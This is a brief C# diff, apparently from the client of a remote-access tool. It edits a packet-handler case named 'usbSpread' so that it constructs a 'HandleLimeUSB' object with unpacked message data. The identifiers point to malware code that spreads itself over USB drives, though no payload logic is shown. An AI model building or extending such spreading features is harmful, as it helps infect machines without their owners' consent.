@@ -101,7 +101,7 @@ namespace Client.Handle_Packet
 
                     case "usbSpread":
                         {
-                            new HandleLimeUSB().Run();
+                            new HandleLimeUSB(unpack_msgpack);
                             break;
                         }
 
